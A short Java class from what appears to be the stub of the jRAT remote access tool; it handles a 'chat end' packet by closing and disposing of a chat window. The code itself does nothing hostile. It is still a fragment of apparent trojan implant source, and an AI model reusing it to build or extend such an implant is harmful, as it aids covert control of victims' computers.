package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

public class Packet49ChatEnd extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Connection.instance.getFrameChat().setVisible(false);
		Connection.instance.getFrameChat().dispose();
		Connection.instance.setFrameChat(null);
	}

}
